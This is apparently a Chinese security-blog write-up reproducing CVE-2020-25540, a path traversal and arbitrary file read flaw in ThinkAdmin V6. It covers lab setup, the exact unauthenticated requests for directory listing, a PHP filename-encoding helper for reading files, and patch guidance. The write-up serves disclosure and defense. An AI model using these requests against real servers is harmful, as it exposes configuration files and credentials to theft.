## **0x00简介**

ThinkAdmin是一套基于ThinkPHP框架的通用后台管理系统，ThinkAdmin 非常适用快速二次开发，默认集成
微信开发组件，支持微信服务号，微信支付，支付宝支付，阿里云OSS存储，七牛云存储，本地服务器存储。，ThinkAdmin的权限管理基于标准RBAC简化而来，去除了繁杂的节点管理，使得权限管理起来更简单，具体包含节点管理、权限管理、菜单管理、用户管理。

  

##  **0x01漏洞概述**

ThinkAdmin
V6版本存在路径遍历漏洞。该漏洞主要是因为api中存在危险函数，且未作任何限制。未作任何认证可以直接调用api中此两危险函数。攻击者可利用该漏洞通过请求编码参数任意读取远程服务器上的文件。

  

##  **0x02影响版本**

ThinkAdmin版本小于 ≤ 2020.08.03.01

  

##  **0x03漏洞名称及编号**

CVE-2020-25540

ThinkAdmin 目录遍历/文件读取漏洞

  

##  **0x04环境搭建**

phpstudy2018+ThinkAdmin v6.0

Composer命令

1）安装Composer命令，phpstudy中PHP设置成7.1或以上版本，并把对应的文件夹放入环境变量path中

![](https://image.3001.net/images/20201109/1604915471_5fa9110fdd15341542a7d.png!small)

2）在phpstudy服务器中打开php.ini文件，找到extension=php_openssl.dll前面的分号去掉，意思是打开ssl扩展，目的是为了能在cmd命令中能进行访问

![](https://image.3001.net/images/20201109/1604915503_5fa9112f88f509d43ae25.png!small)

  

3）安装composer.phar，找到下载内容的地方，去下载当前最新版本的composer.phar，双击安装，不用勾选

下载地址<https://getcomposer.org/Composer-Setup.exe>

![](https://image.3001.net/images/20201109/1604915521_5fa91141211a1999e4e8b.png!small)

  

4）配置环境变量后自动选择了

![](https://image.3001.net/images/20201109/1604915545_5fa911598ebb865b55a97.png!small)

然后一直下一步，安装完成

![](https://image.3001.net/images/20201109/1604915567_5fa9116f84f207986f3bd.png!small)

5）安装完成后在cmd命令行输入composer查看是否安装成功

![](https://image.3001.net/images/20201109/1604915583_5fa9117f33b79f80099ef.png!small)

6）设置阿里云 Composer 代理

由于国内访问Composer比较慢，建议设置阿里云Composer镜像，运行如下命令设置阿里云代理

composer config -g repo.packagist composer
<https://mirrors.aliyun.com/composer>  
---  
  
![](https://image.3001.net/images/20201109/1604915593_5fa9118936786d73572e9.png!small)

7）搜索下载ThinkAdminV6的漏洞版本到本地

![](https://image.3001.net/images/20201109/1604915602_5fa9119290e6a8c51a880.png!small)

8）进入ThinkAdmin目录进行安装

composer install

![](https://image.3001.net/images/20201109/1604915615_5fa9119f1e9c6d44272b7.png!small)

9）然后进config/database.php目录下修改配置文件，需要创建一个数据库

![](https://image.3001.net/images/20201109/1604915627_5fa911abced324a968691.png!small)

10）php进行运行 php think run

![](https://image.3001.net/images/20201109/1604915649_5fa911c113b3adbc191ff.png!small)

[http://ip:8000](http://ip:8000/)打开页面

![](https://image.3001.net/images/20201109/1604915660_5fa911ccdcca0444aa1ea.png!small)

 **0x05漏洞复现**

 **1.目录遍历**

1.1 使用burp抓取首页的包，发送到Repeater模块构造数据包获取目录

![](https://image.3001.net/images/20201109/1604915691_5fa911ebb66a1c97754f8.png!small)

1.2
在Repeater模块中把GET修改成POST，url修改成/admin.html?s=admin/api.Update/node，在下面输入rules=%5b%22%2f%22%5d
//编码为url编码 解码为["/"]

![](https://image.3001.net/images/20201109/1604915788_5fa9124c081136bb7f786.png!small)

1.3点击”Send”发送，可以看到返回包中带有目录列表了

![](https://image.3001.net/images/20201109/1604915808_5fa91260a45b2e7057a07.png!small)

 **注：要是没有返回列表可修改payload中的路径，然后使用url编码即可**

  

 **2\. 任意文件读取**

2.1 我们在根目录下创建文件flag.txt，内容为flag{s4d6f54s}

![](https://image.3001.net/images/20201109/1604915833_5fa91279ae35a886aa3c8.png!small)

2.2 在使用加密函数对flag.txt进行加密，使用php运行加密函数得到2u302p2v1a383c38文件名

<?phpfunction encode($content){list($chars, $length) = ['', strlen($string =
iconv('UTF-8', 'GBK//TRANSLIT', $content))];for ($i = 0; $i < $length; $i++)
$chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0);return
$chars;}$content="flag.txt";echo encode($content);?>  
---  
  
![](https://image.3001.net/images/20201109/1604915849_5fa91289e0682b5f2e43a.png!small)

2.3 访问下面链接即可读取到flag.txt（读其他文件同理）

<http://127.0.0.1:8000/admin.html?s=admin/api.Update/get/encode/2u302p2v1a383c38>

![](https://image.3001.net/images/20201109/1604915860_5fa91294122915d4ebc87.png!small)

2.4 复制后面使用base64加密的一段字符串，解码出来就是flag.txt里的内容

![](https://image.3001.net/images/20201109/1604915878_5fa912a666a3b5ce6c4a9.png!small)

 **0x06修复方式**

1.升级到2020.08.03.01之后的版本

2.使用官方的临时修复方案

[https://github.com/zoujingli/ThinkAdmin/issues/244﻿](https://github.com/zoujingli/ThinkAdmin/issues/244)

